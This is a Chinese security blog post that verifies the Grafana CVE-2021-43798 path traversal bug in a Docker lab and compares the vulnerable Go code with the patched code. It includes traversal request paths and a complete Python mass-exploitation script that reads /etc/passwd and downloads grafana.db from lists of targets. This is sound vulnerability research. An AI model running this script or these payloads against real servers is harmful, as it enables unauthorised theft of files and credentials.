---
title: Grafana 任意文件读取漏洞验证(CVE-2021-43798)
author: Pandaho
date: 2021-12-28 20:00:00 
categories: [Project] 
tags: [security]
image: /assets/img/security-CVE-2021-43798/cover.png
---




## 法律声明

**中华人民共和国刑法：** 第285、286、287条

**第二百八十五条** 违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。

**第二百八十六条** 违反国家规定，对计算机信息系统功能进行删除、修改、增加、干扰，造成计算机信息系统不能正常运行，后果严重的，处五年以下有期徒刑或者拘役；后果特别严重的，处五年以上有期徒刑。违反国家规定，对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作，后果严重的，依照前款的规定处罚。故意制作、传播计算机病毒等破坏性程序，影响计算机系统正常运行，后果严重的，依照第一款的规定处罚。

**第二百八十七条** 利用计算机实施金融诈骗、盗窃、贪污、挪用公款、窃取国家秘密或者其他犯罪的，依照本法有关规定定罪处罚。



## 用知识的土壤来填埋这些坑洞

### Grafana

Grafana是Grafana实验室的一套提供可视化监控界面的开源监控工具。该工具主要用于监控和分析Graphite、InfluxDB和Prometheus等。（其实就是将监控的数据进行分析展示，界面比较酷炫吊炸，支持的数据源有ES、Graphite、InfluxDB、OpenTSDB、MySQL、Druid 、Prometheus、SimpleJson等，提供的应用有Zabbix、K8s等。）

Grafana 8.0.0-beta1至8.3.0存在路径遍历漏洞，攻击者可利用该漏洞执行目录遍历攻击，访问本地文件。（截止到目前官方更新最新版本为8.3.3）

### 任意文件读取

​	攻击者可以通过将包含特殊目录遍历字符序列(../)的特制HTTP请求发送到受影响的设备来利用此漏洞。成功利用该漏洞的攻击者可以在目标设备上查看文件系统上的的任意文件。

​	目录穿越（也被称为目录遍历）是通过使用../等目录控制序列或者文件的绝对路径来访问存储在文件系统上的任意文件和目录，特别是应用程序源代码、配置文件、重要的系统文件等。

​	路径穿越是网站被恶意人员利用，来得到其无权限访问的内容，通常是由于代码没有判断拼接路径的真实路径是否合法，最终导致文件读取，严重的会导致服务器中的敏感重要数据被窃取，例如数据库、WEB配置文件等。

当时收到这个漏洞消息后，检查内网确实有使用这个工具的，不过这工具对外开放比较少，一般都是内网用户自己使用，虽然比较风险比较大，但并没有对外开放，后续官方发布补丁版本后就修复掉了，这次有空来记录下验证。扫了下Internet还是很多人未修复这个漏洞，大部分组织还是安全意识薄弱啊，这种能简单修复的，还暴露在公网，当然也可能不少蜜罐钓鱼的。 

这次我单独在虚拟机搭建了环境，我是使用docker拉取Grafana 8.0.0这个版本。

```shell
docker pull grafana/grafana:8.0.0 #拉取镜像

docker run \   #启动
--user root \
-d \
-p 3000:3000 \
--name=grafana \
-v /home/grafana:/var/lib/grafana \
grafana/grafana:8.0.0

docker ps #查看是否启动
```

环境搭建ok后，访问也正常，使用burp配置代理后抓取request报文，修改get请求就成功了。


### 验证效果

![图例](/assets/img/security-CVE-2021-43798/1.png)

```
可以看到，调用/public/plugins/:pluginId/*就可以访问任意文件，比如/public/plugins/debug/../../../../../etc/passwd。
```

![图例](/assets/img/security-CVE-2021-43798/2.png)

从功能上我们可以看出这里是工具在选择插件未做输入验证，导致传入类似于`../../../etc/`就可以任意读取了。

代码，我们可以在github的项目上看到最新版本的修复内容和旧版本对比。

### 漏洞修复前

**api.go**

```GO
	// expose plugin file system assets
	r.Get("/public/plugins/:pluginId/*", hs.GetPluginAssets)
#GET该路径下的资源，但没有加输入验证
```

**plugins.go**

```go
// /public/plugins/:pluginId/*
#getPluginAssets，这个函数是为了获取插件的静态资源
func (hs *HTTPServer) GetPluginAssets(c *models.ReqContext) {
	pluginID := c.Params("pluginId")
	plugin := hs.PluginManager.GetPlugin(pluginID)
	if plugin == nil {
		c.Handle(hs.Cfg, 404, "Plugin not found", nil)
		return
	}

	requestedFile := filepath.Clean(c.Params("*"))  
	pluginFilePath := filepath.Join(plugin.PluginDir, requestedFile)
#从 URL 段获取路径进行拼接

	// It's safe to ignore gosec warning G304 since we already clean the requested file path and subsequently
	// use this with a prefix of the plugin's directory, which is set during plugin loading
	// nolint:gosec
	f, err := os.Open(pluginFilePath)
    #打开pluginFilePath变量中的文件，文件的内容最终出现在/public/plugins/<pluginID>/<path>调用的 HTTP 响应中
	if err != nil {
		if os.IsNotExist(err) {
			c.Handle(hs.Cfg, 404, "Could not find plugin file", err)
			return
		}
		c.Handle(hs.Cfg, 500, "Could not open plugin file", err)
		return
	}
	defer func() {
		if err := f.Close(); err != nil {
			hs.log.Error("Failed to close file", "err", err)
		}
	}()

	fi, err := f.Stat()
	if err != nil {
		c.Handle(hs.Cfg, 500, "Plugin file exists but could not open", err)
		return
	}

	if shouldExclude(fi) {
		c.Handle(hs.Cfg, 404, "Plugin file not found", nil)
		return
	}

	headers := func(c *macaron.Context) {
		c.Resp.Header().Set("Cache-Control", "public, max-age=3600")
	}

	if hs.Cfg.Env == setting.Dev {
		headers = func(c *macaron.Context) {
			c.Resp.Header().Set("Cache-Control", "max-age=0, must-revalidate, no-cache")
		}
	}

	headers(c.Context)

	http.ServeContent(c.Resp, c.Req.Request, pluginFilePath, fi.ModTime(), f)
}
```



### 漏洞修复后

```go
// prepend slash for cleaning relative paths
requestedFile := filepath.Clean(filepath.Join("/", web.Params(c.Req)["*"]))
rel, err := filepath.Rel("/", requestedFile)
#Rel函数返回一个相对路径
if err != nil {
    // slash is prepended above therefore this is not expected to fail 
    c.JsonApiErr(500, "Failed to get the relative path", err)
    return
}

if !plugin.IncludedInSignature(rel) {
    hs.log.Warn("Access to requested plugin file will be forbidden in upcoming Grafana versions as the file "+
        "is not included in the plugin signature", "file", requestedFile)
}

absPluginDir, err := filepath.Abs(plugin.PluginDir)
if err != nil {
    c.JsonApiErr(500, "Failed to get plugin absolute path", nil)
    return
}

pluginFilePath := filepath.Join(absPluginDir, rel)
```



### 自动化脚本

（脚本来自t00ls[Henry] ）

```python
#!/usr/bin/env python
# -*- conding:utf-8 -*-

import requests
import argparse
import sys
import urllib3
import time
urllib3.disable_warnings()


def title():
    print("""
                 ___                     __                                 ___                        _      ___   _   _       
                / __|  _ _   __ _   / _|  __ _   _ _    __ _     | _ \  ___   __ _   __| |    | __| (_) | |  ___ 
               | (_ | | '_| / _` | |  _| / _` | | ' \  / _` |    |  / / -_) / _` | / _` |   | _|  | | | | / -_)
               \___| |_|   \__,_| |_|   \__,_| |_||_| \__,_|  |_|_\ \___| \__,_| \__,_| |_|   |_| |_| \___|
                                                                                                 

                                                                                                 
                                     Author: Henry4E36
               """)


class information(object):
    def __init__(self, args):
        self.args = args
        self.url = args.url
        self.file = args.file

    def target_url(self):
        lists = ['grafana-clock-panel', 'alertGroups', 'alertlist', 'alertmanager', 'annolist', 'barchart', 'bargauge',\
                'canvas', 'cloudwatch', 'cloudwatch', 'dashboard', 'dashboard', 'dashlist', 'debug', 'elasticsearch',\
                'gauge','geomap', 'gettingstarted', 'grafana-azure-monitor-datasource', 'grafana', 'graph', 'graphite',\
                 'graphite', 'heatmap', 'histogram', 'influxdb', 'jaeger', 'live', 'logs', 'logs', 'loki', 'mixed', \
                 'mssql', 'mysql', 'news', 'nodeGraph', 'opentsdb', 'piechart', 'pluginlist', 'postgres', 'prometheus',\
                 'stat', 'state-timeline', 'status-history', 'table-old', 'table', 'tempo', 'testdata', 'text', \
                 'timeseries', 'welcome', 'xychart', 'zipkin']
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
        }

        # proxies = {
        #     "http": "http://127.0.0.1:8080",
        #
        # }
        for i in lists:
            target_url = self.url + f"/public/plugins/{i}/%23/../..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd"
            try:
                res = requests.get(url=target_url, headers=headers, verify=False, timeout=5)
                if res.status_code == 200 and "root:" in res.text:
                    print(f"\033[31m[{chr(8730)}] 目标系统: {self.url}的{i}插件存在任意文件读取\033[0m")
                    print(f"[-] 尝试读取DB文件:")
                    db_url = self.url + f"/public/plugins/{i}/%23/../..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/var/lib/grafana/grafana.db"
                    try:
                        res_db = requests.get(url=db_url, headers=headers, verify=False, timeout=25)
                        if res_db.status_code == 200 and "SQLite format" in res_db.text:
                            a = time.time()
                            with open(f'{a}.db', "w") as f:
                                f.write(res_db.text)
                            f.close()
                            print(f"\033[31m[{chr(8730)}] 成功读取DB文件，信息保存在{a}.db文件中\033[0m")
                        else:
                            print(f"[-] 读取DB文件失败")
                    except Exception as e:
                        print("[\033[31mX\033[0m] 读取DB文件错误,可能与请求时间有关!")
                        print("[" + "-" * 100 + "]")
                else:
                    print(f"[\033[31mx\033[0m]  目标系统: {self.url} 不存在{i}插件！")
                    print("[" + "-"*100 + "]")
            except Exception as e:
                print("[\033[31mX\033[0m]  连接错误！")
                print("[" + "-"*100 + "]")

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)



if __name__ == "__main__":
    title()
    parser = ar=argparse.ArgumentParser(description='Grafana 任意文件读取')
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"ip.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 grafana-read.py -u [url]http://127.0.0.1[/url]\neg2:>>>python3 grafana-read.py -f ip.txt")
    elif args.url:
        information(args).target_url()

    elif args.file:
        information(args).file_url()
```

### 脚本输出

```shell
python test.py -u http://192.168.80.128:3000

                 ___                     __                                 ___                        _      ___   _   _
                / __|  _ _   __ _   / _|  __ _   _ _    __ _     | _ \  ___   __ _   __| |    | __| (_) | |  ___
               | (_ | | '_| / _` | |  _| / _` | | ' \  / _` |    |  / / -_) / _` | / _` |   | _|  | | | | / -_)
               \___| |_|   \__,_| |_|   \__,_| |_||_| \__,_|  |_|_\ \___| \__,_| \__,_| |_|   |_| |_| \___|



                                     Author: Henry4E36

[?[31mx?[0m]  目标系统: http://192.168.80.128:3000 不存在grafana-clock-panel插件！
[----------------------------------------------------------------------------------------------------]
[?[31mx?[0m]  目标系统: http://192.168.80.128:3000 不存在alertGroups插件！
[----------------------------------------------------------------------------------------------------]
?[31m[√] 目标系统: http://192.168.80.128:3000的alertlist插件存在任意文件读取?[0m
[-] 尝试读取DB文件:
[?[31mX?[0m] 读取DB文件错误,可能与请求时间有关!
[----------------------------------------------------------------------------------------------------]
```

使用脚本发送了以上报错，在审计代码后，发现`except Exception as e:`做了错误输出，但却没有打印，在增加print后，输出错误原因：

`'gbk' codec can't encode character '\ufffd' in position 27: illegal multibyte sequence`

一看又是编码的原因，我直接在`open(f'{a}.db', "w",encoding='utf-8')`加指定编码，最后成功输出。



## 参考来源

[漏洞发布者](https://j0vsec.com/post/cve-2021-43798/)  
[漏洞详解](https://saucer-man.com/information_security/856.html)  
[漏洞警告](https://blog.riskivy.com/grafana-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E6%B1%87%E6%80%BBcve-2021-43798/)
[Github项目](https://github.com/grafana/grafana)